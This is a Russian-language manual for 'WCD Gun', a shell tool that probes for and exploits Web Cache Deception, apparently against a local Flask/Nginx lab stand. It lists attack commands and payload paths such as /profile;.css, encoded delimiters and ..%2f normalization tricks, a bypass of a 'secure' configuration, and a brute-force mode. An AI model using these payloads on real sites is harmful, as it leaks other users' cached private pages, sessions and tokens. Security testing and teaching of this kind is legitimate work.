 1. НАЗНАЧЕНИЕ
═══════════════════════════════════════════════════════════════

WCD Gun — интерактивный инструмент для автоматизированного обнаружения
и эксплуатации уязвимости Web Cache Deception (WCD). 
Работает как в ручном режиме, так и в связке с WCD Launcher.

Основные возможности v10.11:
  - Одиночные выстрелы (single / combo)
  - Массовый перебор (burst / fire) с прерыванием по Ctrl+C
  - Умный детектор кэша (6 уровней уверенности)
  - Сравнение тел ответов на утечку чувствительных данных
  - Подтверждение статуса кэша повторными запросами
  - Поддержка проксирования (Burp Suite)
  - Просмотр обойм (magazines) и хитов (hits) без выхода
  - Прямые curl-запросы (raw) — обход автоматики
  - Логирование успешных векторов
  - Управление обоймами (разделители, расширения, static dirs, эндпоинты)
  - Единая функция сборки пути (build_path) для всех режимов атаки
  - Двойной Ctrl+C для гарантированного выхода (без залипания v10.11)
  - Корректная работа с пустыми обоймами расширений (none.extensions)

═══════════════════════════════════════════════════════════════
 2. БЫСТРЫЙ СТАРТ
═══════════════════════════════════════════════════════════════

   chmod +x wcd_gun.sh
   ./wcd_gun.sh
   
При первом запуске создаются каталоги magazines/ и reports/,
а также дефолтные обоймы. Сразу виден баннер, конфигурация
и шпаргалка команд.

Для атаки на готовый стенд:

   wcd> set target 127.0.0.1:8080
   wcd> set cookie "session=valid"
   wcd> profile          ← профилирование кэша
   wcd> burst            ← тотальный перебор

Или из лаунчера:

   wcd-launcher > gun

Пулемёт получит цель автоматически.

═══════════════════════════════════════════════════════════════
 3. КОМАНДЫ
═══════════════════════════════════════════════════════════════

── НАСТРОЙКА ─────────────────────────────────────────────────

  start               — мастер первоначальной настройки обойм
  set target <URL>    — задать цель (host:port, без http://)
  set cookie <строка> — установить cookie для прогрева кэша
  proxy on|off|status — проксирование через Burp (127.0.0.1:8082)

── РАЗВЕДКА ──────────────────────────────────────────────────

  target              — проверить доступность цели, показать кэш-заголовки
  cookie              — проверить валидность куки
  profile [URL]       — профилирование кэша (с кукой / без куки, сравнение тел)

── АТАКА ─────────────────────────────────────────────────────

  single <путь>       — одиночный выстрел.
                        Прогрев с кукой → проверка без куки.
                        Пример: single /profile;.css
                        Можно с encoded: single /profile%3B.css
                        ВАЖНО: ; в single работает без кавычек.

  combo <sdir> <d> <e> <ep>
                       — ручная сборка вектора.
                        sdir = static directory ("" — без неё)
                        d    = разделитель (;, %3B, ?, #)
                        e    = расширение (.css, %2ecss, .js)
                        ep   = endpoint (profile, api/keys)
                        Пример: combo /images %3B .css profile

  burst               — полный перебор (static dirs × разделители ×
                        расширения × эндпоинты). Можно прервать Ctrl+C.
                        Работает с пустыми обоймами расширений.

  fire                — быстрый перебор (разделители × расширения × эндпоинты).
                        Не требует static dirs. Можно прервать Ctrl+C.

  raw <аргументы> <URL>
                       — прямой curl-запрос в обход автоматики.
                        ВАЖНО: если URL содержит ; & ? # | $ — в кавычки!
                        Правильно:  raw "http://target/profile;.css"
                        Неправильно: raw http://target/profile;.css
                        Почему: eval интерпретирует ; как команду.
                        single/combo/burst/fire — работают без кавычек.

── УПРАВЛЕНИЕ ОБОЙМАМИ ────────────────────────────────────────

  load <тип> <имя>    — загрузить обойму.
                        Типы: delimiters, extensions, staticdir, endpoints
                        Пример: load delimiters normalization

  add <разделитель>   — добавить разделитель в текущую обойму.

  magazines           — показать все обоймы в магазине

── ИНФОРМАЦИЯ ────────────────────────────────────────────────

  show                — показать цель, прокси, текущие обоймы
  hits                — показать успешные хиты (из successful_vectors.log)
  help                — полная справка
  quit / exit         — выход (также: двойной Ctrl+C)

═══════════════════════════════════════════════════════════════
 4. ДЕТЕКТОР КЭША (6 уровней уверенности)
═══════════════════════════════════════════════════════════════

  HIT_STRONG  [✓✓]  — явный HIT + Age > 0. Уверенность 95%.
  HIT_WEAK    [✓]   — HIT без Age, либо Age без HIT. 40-65%.
  MISS_STRONG [✗]   — явный MISS. Уверенность 90%.
  MISS_WEAK   [?]   — есть кэш-заголовки, статус не ясен. 30%.
  DYNAMIC     [~]   — Cache-Control: no-cache/private/must-revalidate. 90%.
  UNKNOWN     [ ]   — нет кэш-заголовков.

Успех = HIT_STRONG или HIT_WEAK.

═══════════════════════════════════════════════════════════════
 5. СРАВНЕНИЕ ТЕЛ ОТВЕТОВ
═══════════════════════════════════════════════════════════════

Для single/combo сравниваются тело "прогрева" (с кукой) и "проверки" (без):

  - Разница в длине ≤ 10% → длины СОВПАДАЮТ
  - Наличие маркеров: email, @, profile, account, dashboard, admin,
    token, session, api, secret, password, credit, card

Совпадение длин + маркеры = "ВЕРОЯТНАЯ УТЕЧКА!"

═══════════════════════════════════════════════════════════════
 6. ОБОЙМЫ (MAGAZINES)
═══════════════════════════════════════════════════════════════

Файлы в magazines/. Строки — элементы. Пустые и #comment игнорируются.

Типы:
  *.delimiters  — ;  %3B  ?  #  %23  %3F
  *.extensions  — .css  .js  .jpg  %2ecss  %2ejs
  *.staticdir   — /static  /images  /assets
  *.endpoints   — profile  account  admin  api/keys

Встроенные обоймы:
  default.*          — базовые наборы
  encoded.delimiters — только URL-encoded разделители
  none.extensions    — пустой файл расширений (атака без расширения)

Свои обоймы:
  normalization.*    — для Normalization Discrepancy (создаются вручную)

═══════════════════════════════════════════════════════════════
 7. КОМАНДА RAW — ПРЯМЫЕ ЗАПРОСЫ
═══════════════════════════════════════════════════════════════

Синтаксис:
   raw [curl-флаги] <URL>

   URL всегда последний.
   Если URL содержит ; & ? # | $ — ОБЯЗАТЕЛЬНО в кавычки!
   Прокси учитывается автоматически.

Примеры:
   wcd> raw http://127.0.0.1:8080/profile
        → простой GET, вывод тела

   wcd> raw "http://127.0.0.1:8080/profile;.css"
        → URL с точкой-с-запятой, обязательно в кавычках

   wcd> raw -s -D - http://127.0.0.1:8080/profile
        → вывести заголовки ответа

   wcd> raw -X POST -d "user=test" http://target/api/login
        → POST-запрос с телом

Почему для raw нужны кавычки, а для single — нет:
  single использует read -r (читает строку как текст)
  raw использует eval (интерпретирует ; как разделитель команд)
  Поэтому: single /profile;.css — ок. raw http://.../profile;.css — ОБРЕЖЕТСЯ.

═══════════════════════════════════════════════════════════════
 8. ТЕХНИКИ АТАК
═══════════════════════════════════════════════════════════════

── DELIMITER ATTACK (основная) ───────────────────────────────

Использует разделитель (;, %3B) чтобы обмануть кэш.
Кэш видит .css → кэширует. Бэкенд обрезает ;.css → отдаёт данные.

   single /profile;.css
   single /profile%3B.css

── NORMALIZATION DISCREPANCY ──────────────────────────────────

Расхождение нормализации между кэшем и бэкендом.
Кэш не декодит %2f, бэкенд декодит и обрабатывает ../

   /static/..%2fprofile%3B.css
   Кэш видит: /static/... → статика → кэширует
   Бэкенд видит: /static/../profile → /profile → отдаёт данные

   ВАЖНО: твой бэкенд (Werkzeug) не декодит %2f по умолчанию.
   Чтобы техника заработала, добавь unquote в middleware.

── CLEAN EXTENSION (обход защиты) ─────────────────────────────

Если бэкенд использует catch-all маршрут (<path:anything>),
атака работает без разделителя — просто добавляем расширение:

   single /profile/user.css
   Кэш видит .css → кэширует. Бэкенд ловит <path:anything> → отдаёт.

   Эта техника обходит даже secure-конфиг с фильтрацией спецсимволов.

═══════════════════════════════════════════════════════════════
 9. ИНТЕГРАЦИЯ С WCD LAUNCHER
═══════════════════════════════════════════════════════════════

Лаунчер (wcd_framework.sh) поднимает стенд Flask + Nginx в RAM.
Два режима:
  vuln   — уязвимый (без защиты)
  secure — с фильтрацией спецсимволов и path traversal

Команда "gun" запускает пулемёт. Ctrl+C×2 возвращает в меню лаунчера.

═══════════════════════════════════════════════════════════════
10. CTRL+C — ПРЕРЫВАНИЕ И ВЫХОД
═══════════════════════════════════════════════════════════════

  Первый Ctrl+C:
    → "Действие прервано (повторный Ctrl+C для выхода)"
    → возврат к wcd>

  Второй Ctrl+C:
    → "Повторный Ctrl+C — выход"
    → мгновенный выход (флаг сбрасывается, залипания нет)

  Во время burst/fire:
    → Первый Ctrl+C останавливает перебор
    → Хиты сохраняются, hits покажет результат

═══════════════════════════════════════════════════════════════
11. ПРОКСИРОВАНИЕ (Burp Suite)
═══════════════════════════════════════════════════════════════

   wcd> proxy on          — включить (Burp должен быть запущен)
   wcd> proxy off         — выключить
   wcd> proxy status      — текущий статус

По умолчанию: 127.0.0.1:8082

13. ПРИМЕРЫ
═══════════════════════════════════════════════════════════════

Обычная атака через разделитель:
   wcd> set target 127.0.0.1:8080
   wcd> set cookie "session=valid"
   wcd> single /profile;.css

Атака через encoded разделитель:
   wcd> single /profile%3B.css

Clean extension (обход secure-конфига):
   wcd> single /profile/user.css

Разведка через raw:
   wcd> raw "http://127.0.0.1:8080/profile;.css"

Тотальный перебор:
   wcd> burst
   wcd> hits

Свои обоймы:
   wcd> load delimiters my_custom
   wcd> burst

Без расширений:
   wcd> load extensions none
   wcd> fire

14. УСТРАНЕНИЕ НЕИСПРАВНОСТЕЙ
═══════════════════════════════════════════════════════════════

"Нет ответа от ..."
  → проверь цель: target
  → стенд запущен? в лаунчере: status
  → выключи прокси: proxy off

HTTP 000 на все запросы
  → прокси включен, Burp не запущен → proxy off

"Комбинаций: 0"
  → обоймы не загружены — show
  → обоймы не в RAM — перезапусти лаунчер
  → загрузи дефолтные: start → y

raw режет по ; или &
  → бери URL в кавычки: raw "http://target/profile;.css"
  → single/combo/burst/fire работают без кавычек

Ctrl+C залипает (бесконечные сообщения)
  → исправлено в v10.11: SHOULD_QUIT сбрасывается мгновенно

Кука "невалидна" но атака работает
  → check_cookie проверяет GET /, а там 302 или 404
  → игнорируй — кука сохранена и single/burst её используют
